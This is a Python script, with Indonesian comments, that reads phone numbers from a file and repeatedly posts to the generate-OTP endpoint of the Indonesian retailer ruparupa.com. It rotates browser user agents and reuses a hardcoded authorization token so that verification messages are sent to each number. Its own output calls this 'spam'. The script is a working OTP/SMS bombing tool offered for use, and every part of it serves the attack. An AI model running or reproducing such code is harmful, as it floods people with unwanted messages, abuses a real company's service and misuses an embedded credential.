import requests
import json
import random
import rich
from rich import print as cetak
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.80",
]

try:
   nama_file = input("Nama file: ")

   while True:
        ua = random.choice(user_agents)
      # Membuka file untuk dibaca
        with open(nama_file, 'r') as file:
          # Membaca isi file
            isi_file = file.read()

      # Memproses setiap baris dalam file
        for baris in isi_file.split('\n'):
          # Menghapus spasi atau karakter newline di awal dan akhir baris
            nomor = baris.strip()

          # Memeriksa apakah baris hanya terdiri dari spasi atau newline
            if not nomor:
                continue  # Langsung ke baris berikutnya jika baris kosong

            pos = requests.post(

            "https://wapi.ruparupa.com/auth/generate-otp",
            headers={
            "Host": "wapi.ruparupa.com",
            "content-length": "120",
            "sec-ch-ua-mobile": "?0",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs",
            "content-type": "application/json",
            "x-company-name": "odi",
            "accept": "application/json",
            "user-agent": ua,
            "user-platform": "desktop",
            "x-frontend-type": "desktop",
            "sec-ch-ua-platform": "Linux",
            "origin": "https://www.ruparupa.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.ruparupa.com/verification?page=otp-choices",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                # ... (Header lainnya tetap sama)
            },
            data=json.dumps({"phone": "0" + nomor, "action": "register", "channel": "message", "email": "", "token": "", "customer_id": "0", "is_resend": 0})
        ).text

            cetak("Spam ke ",nomor)
            cetak(ua)


        lanjutkan = input("Apakah Anda ingin melanjutkan spam? (y/n): ")
        if lanjutkan.lower() != 'y':
            break  # Menghentikan loop jika pengguna tidak ingin melanjutkan

except FileNotFoundError:
  cetak("File not found!!")
  cetak("Try again!!")
except EOFError:
  cetak("Aborted!")
